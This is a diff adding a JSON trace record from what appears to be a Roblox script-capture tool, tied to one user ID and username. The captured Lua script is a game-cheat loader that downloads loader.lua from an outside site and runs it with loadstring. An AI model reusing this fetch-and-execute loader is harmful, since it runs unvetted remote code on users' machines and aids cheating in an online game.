@@ -1,0 +1,36 @@
+{
+  "schemaVersion": 1,
+  "type": "inventory_remote_trace",
+  "userId": "765329164",
+  "username": "capuccino40",
+  "capturedAt": "2026-09-07T18:33:51.000Z",
+  "serverReceivedAt": "2026-09-07T18:33:51.859Z",
+  "placeId": 107778070777162,
+  "gameId": 10563114921,
+  "runId": "SCRIPT_CAPTURE_1_9900f7a7_B1_1788806031",
+  "trace": {
+    "records": [
+      {
+        "total": 1,
+        "index": 1,
+        "origin": "httpget",
+        "kind": "script_source_chunk",
+        "stage": "universal_pass_through",
+        "data": "-- ScriptVerse / steal-an-egg-pet-spawner\n-- Update scripts on the server - this URL never needs to change.\npcall(function()\n  local g = getgenv and getgenv() or _G\n  g.SV_SLUG = \"steal-an-egg-pet-spawner\"\nend)\nlocal function __sv_httpget(url)\n  local ok, body = pcall(function()\n    return game:HttpGet(url)\n  end)\n  if ok and type(body) == \"string\" and #body > 10 then\n    return body\n  end\n  local req = (syn and syn.request) or (http and http.request) or http_request or request\n  if req then\n    local r = req({ Url = url, Method = \"GET\" })\n    local b = r and (r.Body or r.body)\n    if type(b) == \"string\" and #b > 10 then\n      return b\n    end\n  end\n  error(\"ScriptVerse: failed to download \" .. tostring(url))\nend\nlocal __sv_src = __sv_httpget(\"https://scriptversekey.xyz/loader.lua\")\nlocal __sv_fn, __sv_err = loadstring(__sv_src)\nif not __sv_fn then\n  error(\"ScriptVerse: loader compile failed: \" .. tostring(__sv_err))\nend\n__sv_fn()\n"
+      }
+    ],
+    "origin": "httpget",
+    "remotes": [],
+    "batchTotal": 1,
+    "stage": "universal_pass_through",
+    "chunkCount": 1,
+    "sourceIndex": 1,
+    "sourceHash": "9900f7a7-945",
+    "version": "CAFEINA_UNIVERSAL_CAPTURE_V2",
+    "batchIndex": 1,
+    "sourceChars": 945,
+    "captureId": "CAP_107778070777162_765329164_1788806030_1",
+    "runId": "SCRIPT_CAPTURE_1_9900f7a7_B1_1788806031",
+    "detail": "https://scriptversekey.xyz/s/steal-an-egg-pet-spawner"
+  }
+}
